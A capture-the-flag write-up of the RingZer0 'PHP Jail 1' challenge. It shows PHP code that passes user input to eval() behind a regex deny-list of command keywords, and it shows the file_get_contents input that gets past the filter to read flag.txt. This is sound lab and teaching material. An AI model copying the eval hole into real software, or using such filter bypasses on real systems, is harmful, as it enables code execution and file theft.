# PHP Jail 1

LINK : https://ringzer0ctf.com/challenges/223

# My Approach
- Let's login

```sh
$ ssh level1@challenges.ringzer0team.com -p 10223
PHP Jail Level 1:
Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)

Flag is located at /home/level1/flag.txt

Challenge PHP code:
-----------------------------

<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
        if(preg_match('/(`|open|exec|pass|system|\$|\/)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>

-----------------------------
Your input:
```
Quick scans shows : 
- we need to pass some arguments to cat the flag.php
- eval - which executes php code
- To cat using PHP, quick Google Search gives `file_get_contents`

Let's try to use the same.

```sh
$a=file_get_contents('flag.php'); echo $a;
Restricted characters has been used
```

We got to bypass 

```php
        if(preg_match('/(`|open|exec|pass|system|\$|\/)/i', $var)) {
```
- So we cannot use $
- Let me try to use cat command
- To use cat we need exec or system command, cat doesnt seem an option now

Next Approch : 
- My next approch was to use require, Consider the variable would be $flag
- require flag.php; echo $flag;
- Again Restricted characters has been used, sice $ was used

Back to Basics : 
- Let me re read the question.
- Oh, it is flag.txt and not flag.php :|

```sh
echo file_get_contents('flag.txt');
YOUR FLAG HERE :D
```

